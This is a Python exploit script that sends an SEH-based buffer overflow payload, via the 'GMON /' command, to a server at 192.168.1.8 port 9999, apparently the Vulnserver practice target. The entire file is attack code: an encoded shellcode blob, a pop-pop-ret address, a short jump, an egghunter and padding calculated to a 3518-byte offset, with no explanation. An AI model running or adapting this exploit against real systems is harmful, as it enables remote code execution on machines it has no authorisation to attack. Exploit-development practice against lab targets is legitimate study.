import socket
import struct

s = socket.socket()
s.connect(('192.168.1.8',9999))

print(s.recv(1024))

total = 10000
offset = 3518

buf =  b""
buf += b"\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05"
buf += b"\xef\xff\xff\xff\x48\xbb\x93\x70\x90\x39\x2f\xb9\xd5"
buf += b"\x8c\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
buf += b"\x6f\x38\x13\xdd\xdf\x51\x15\x8c\x93\x70\xd1\x68\x6e"
buf += b"\xe9\x87\xdd\xc5\x38\xa1\xeb\x4a\xf1\x5e\xde\xf3\x38"
buf += b"\x1b\x6b\x37\xf1\x5e\xde\xb3\x38\x1b\x4b\x7f\xf1\xda"
buf += b"\x3b\xd9\x3a\xdd\x08\xe6\xf1\xe4\x4c\x3f\x4c\xf1\x45"
buf += b"\x2d\x95\xf5\xcd\x52\xb9\x9d\x78\x2e\x78\x37\x61\xc1"
buf += b"\x31\xc1\x71\xa4\xeb\xf5\x07\xd1\x4c\xd8\x38\xff\x32"
buf += b"\x55\x04\x93\x70\x90\x71\xaa\x79\xa1\xeb\xdb\x71\x40"
buf += b"\x69\xa4\xf1\xcd\xc8\x18\x30\xb0\x70\x2e\x69\x36\xda"
buf += b"\xdb\x8f\x59\x78\xa4\x8d\x5d\xc4\x92\xa6\xdd\x08\xe6"
buf += b"\xf1\xe4\x4c\x3f\x31\x51\xf0\x22\xf8\xd4\x4d\xab\x90"
buf += b"\xe5\xc8\x63\xba\x99\xa8\x9b\x35\xa9\xe8\x5a\x61\x8d"
buf += b"\xc8\x18\x30\xb4\x70\x2e\x69\xb3\xcd\x18\x7c\xd8\x7d"
buf += b"\xa4\xf9\xc9\xc5\x92\xa0\xd1\xb2\x2b\x31\x9d\x8d\x43"
buf += b"\x31\xc8\x78\x77\xe7\x8c\xd6\xd2\x28\xd1\x60\x6e\xe3"
buf += b"\x9d\x0f\x7f\x50\xd1\x6b\xd0\x59\x8d\xcd\xca\x2a\xd8"
buf += b"\xb2\x3d\x50\x82\x73\x6c\x8f\xcd\x71\x95\xb8\xd5\x8c"
buf += b"\x93\x70\x90\x39\x2f\xf1\x58\x01\x92\x71\x90\x39\x6e"
buf += b"\x03\xe4\x07\xfc\xf7\x6f\xec\x94\x59\xc8\xa6\x99\x31"
buf += b"\x2a\x9f\xba\x04\x48\x73\x46\x38\x13\xfd\x07\x85\xd3"
buf += b"\xf0\x99\xf0\x6b\xd9\x5a\xbc\x6e\xcb\x80\x02\xff\x53"
buf += b"\x2f\xe0\x94\x05\x49\x8f\x45\x5a\x4e\xd5\xb6\xa2\xf6"
buf += b"\x08\xf5\x39\x2f\xb9\xd5\x8c"


#!mona egg -t CAPT
egg = b'z0x0'
#egghunter = b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
#egghunter += b"\xef\xb8\x43\x41\x50\x54\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
egghunter = b'\x54\x59\x48\x83\xc1\xff\x48\xff\xc1\x81\x79\xfc\x7a\x30\x78\x30\x75\xf4\xff\xe1'

shellcode = buf
nop_sled = b'\x90'*15
ppr = struct.pack("<I",0x6250172B)
jmp = b'\xeb\x0e\x90\x90'

payload = [
    b'GMON /',
    egg,
    b'\x90'*10,
    shellcode,
    b'\x90'*(offset-len(shellcode)-10-len(egg)),
    jmp,
    ppr,
    nop_sled,
    egghunter,
    b'D'*(total-offset-8-len(nop_sled)-len(egghunter))
]

payload = b"".join(payload)

s.send(payload)
s.close()
